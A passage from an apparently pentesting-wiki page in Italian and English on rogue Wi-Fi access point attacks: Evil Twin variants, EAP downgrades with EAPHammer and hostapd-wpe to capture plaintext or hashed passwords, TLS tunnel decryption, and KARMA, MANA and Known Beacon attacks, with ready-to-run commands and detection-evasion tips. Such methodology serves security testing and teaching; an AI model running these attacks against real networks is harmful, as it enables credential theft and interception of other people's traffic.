- **Roaming del client e manipolazione della connessione**: Il protocollo 802.11 permette ai dispositivi di effettuare roaming tra access point all'interno dello stesso ESS. Gli attaccanti possono sfruttare questo inducendo un dispositivo a disconnettersi dalla base station corrente e a connettersi a un rogue access point. Ciò può essere ottenuto offrendo un segnale più forte o interrompendo la connessione all'access point legittimo tramite metodi come deauthentication packets o jamming.
- **Sfide nell'esecuzione**: Eseguire con successo un attacco Evil Twin in ambienti con più access point ben posizionati può essere complicato. Deauthenticating un singolo access point legittimo spesso fa sì che il dispositivo si connetta a un altro access point legittimo, a meno che l'attaccante non possa deauthenticate tutti gli access point nelle vicinanze o posizionare strategicamente il rogue access point.

Puoi creare un Open Evil Twin molto basico (senza la capacità di instradare il traffico su Internet) eseguendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Puoi anche creare un Evil Twin usando **eaphammer** (nota che per creare evil twins con eaphammer l'interfaccia **NON dovrebbe essere** in modalità **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Oppure usando Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Si noti che, di default, se un ESSID nella PNL è salvato come protetto WPA, il dispositivo non si connetterà automaticamente a un Open evil Twin. Puoi provare a eseguire un DoS sul reale AP e sperare che l'utente si connetta manualmente al tuo Open evil Twin, oppure puoi eseguire un DoS sul reale AP e usare un WPA Evil Twin per catturare il handshake (usando questo metodo non sarai in grado di permettere alla vittima di connettersi a te poiché non conosci la PSK, ma puoi catturare l'handshake e provare a crackarlo).

_Alcuni OS e AV avvertiranno l'utente che connettersi a una rete Open è pericoloso..._

### WPA/WPA2 Evil Twin

Puoi creare un **Evil Twin using WPA/2** e se i dispositivi sono configurati per connettersi a quel SSID con WPA/2, proveranno a connettersi. Comunque, **to complete the 4-way-handshake** devi anche **conoscere** la **password** che il client userà. Se **non la conosci**, la **connessione non verrà completata**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Per comprendere questo attacco, consiglio di leggere prima la breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Utilizzo di hostapd-wpe**

`hostapd-wpe` ha bisogno di un file di **configurazione** per funzionare. Per **automatizzare** la generazione di queste configurazioni puoi usare [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (scarica il file python all'interno di _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Nel file di configurazione puoi selezionare molte impostazioni diverse come ssid, channel, user files, cret/key, dh parameters, wpa version e auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Utilizzo di EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Di default, EAPHammer utilizza questi metodi di autenticazione (nota GTC come il primo da provare per ottenere password in chiaro e poi l'uso di metodi di auth più robusti):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Questa è la metodologia predefinita per evitare lunghi tempi di connessione. Tuttavia, puoi anche specificare al server i metodi di autenticazione dal più debole al più forte:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

All'interno della **configuration** di _hostapd-wpe_ **commenta** la riga che contiene _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Questo farà sì che `hostapd-wpe` **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Ora avvia l'**Evil Twin** usando **`hostapd-wpe`** con quella configurazione modificata come al solito. Avvia anche **`wireshark`** sull'**interface** che sta eseguendo l'Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Aggiungi una nuova voce e compila il form con questi valori: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

E guarda la nuova **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### Blacklist/Whitelist per ESSID e MAC

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Il rogue AP risponderà solo alle probe requests dai dispositivi specificati nella whitelist, rimanendo invisibile agli altri non elencati.
2. **MAC-based Blacklist**:
- Il rogue AP ignorerà le probe requests dai dispositivi presenti nella blacklist, rendendo il rogue AP effettivamente invisibile a quei dispositivi.
3. **SSID-based Whitelist**:
- Il rogue AP risponderà alle probe requests solo per specifici ESSIDs elencati, rendendolo invisibile ai dispositivi le cui Preferred Network Lists (PNLs) non contengono quegli ESSIDs.
4. **SSID-based Blacklist**:
- Il rogue AP non risponderà alle probe requests per gli ESSIDs specifici presenti nella blacklist, rendendolo invisibile ai dispositivi che cercano quelle reti particolari.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Questo metodo permette a un **attaccante di creare un access point malevolo (AP) che risponde a tutte le probe requests** dai dispositivi che cercano di connettersi alle reti. Questa tecnica **inganna i dispositivi inducendoli a connettersi all'AP dell'attaccante** imitando le reti che i dispositivi stanno cercando. Quando un dispositivo invia una richiesta di connessione a questo rogue AP, completa la connessione, portando il dispositivo a connettersi per errore alla rete dell'attaccante.

### MANA

Successivamente, **i dispositivi cominciarono a ignorare risposte di rete non affidabili**, riducendo l'efficacia dell'original karma attack. Tuttavia, è stato introdotto un nuovo metodo, noto come la **MANA attack**, da Ian de Villiers e Dominic White. Questo metodo prevede che il rogue AP **catturi le Preferred Network Lists (PNL) dai dispositivi rispondendo alle loro broadcast probe requests** con nomi di rete (SSID) precedentemente usati dai dispositivi. Questo attacco sofisticato bypassa le protezioni contro l'original karma attack sfruttando il modo in cui i dispositivi ricordano e danno priorità alle reti conosciute.

The MANA attack operates by monitoring both directed and broadcast probe requests from devices. For directed requests, it records the device's MAC address and the requested network name, adding this information to a list. When a broadcast request is received, the AP responds with information matching any of the networks on the device's list, enticing the device to connect to the rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Una **Loud MANA attack** è una strategia avanzata per i casi in cui i dispositivi non usano directed probing o quando le loro Preferred Network Lists (PNL) sono sconosciute all'attaccante. Si basa sul principio che **i dispositivi nella stessa area probabilmente condividono alcuni nomi di rete nelle loro PNL**. Invece di rispondere in modo selettivo, questo attacco trasmette probe responses per ogni nome di rete (ESSID) trovato nelle PNL combinate di tutti i dispositivi osservati. Questo approccio ampio aumenta la probabilità che un dispositivo riconosca una rete familiare e tenti di connettersi al rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Quando il **Loud MANA attack** potrebbe non essere sufficiente, il **Known Beacon attack** offre un altro approccio. Questo metodo **forza il processo di connessione simulando un AP che risponde a qualsiasi nome di rete, scorrendo una lista di potenziali ESSIDs** ricavata da una wordlist. Questo simula la presenza di numerose reti, sperando di trovare una corrispondenza con un ESSID nella PNL della vittima, inducendo un tentativo di connessione all'AP fabbricato. L'attacco può essere amplificato combinandolo con l'opzione `--loud` per un tentativo più aggressivo di attirare dispositivi.

Eaphammer ha implementato questo attacco come un MANA attack in cui tutti gli ESSIDs presenti in una lista vengono trasmessi (puoi anche combinare questo con `--loud` per creare un Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

La **Known Beacon Burst attack** consiste nella trasmissione a raffica di beacon frames per ogni ESSID elencato in un file. Questo crea un ambiente denso di reti fake, aumentando notevolmente la probabilità che i dispositivi si connettano al rogue AP, specialmente se combinato con una MANA attack. Questa tecnica sfrutta velocità e volume per sovraccaricare i meccanismi di selezione delle reti dei dispositivi.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** è un protocollo che permette ai dispositivi di collegarsi direttamente tra loro usando il Wi‑Fi senza la necessità di un tradizionale access point wireless. Questa funzionalità è integrata in vari dispositivi Internet of Things (IoT), come stampanti e televisori, facilitando la comunicazione diretta da dispositivo a dispositivo. Una caratteristica notevole di Wi‑Fi Direct è che un dispositivo assume il ruolo di access point, noto come group owner, per gestire la connessione.

La sicurezza delle connessioni Wi‑Fi Direct è stabilita tramite **Wi-Fi Protected Setup (WPS)**, che supporta diversi metodi per l'accoppiamento sicuro, tra cui:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Questi metodi, in particolare PIN entry, sono vulnerabili alle stesse debolezze di WPS nelle reti Wi‑Fi tradizionali, rendendoli bersagli per vettori di attacco simili.

### EvilDirect Hijacking

**EvilDirect Hijacking** è un attacco specifico per Wi‑Fi Direct. Riprende il concetto dell'attacco Evil Twin ma prende di mira le connessioni Wi‑Fi Direct. In questo scenario, un attaccante impersona un legittimo group owner con l'obiettivo di ingannare i dispositivi affinché si connettano a un'entità malevola. Questo metodo può essere eseguito usando strumenti come `airbase-ng` specificando il channel, ESSID e MAC address del dispositivo impersonato:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Dai un'occhiata a [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
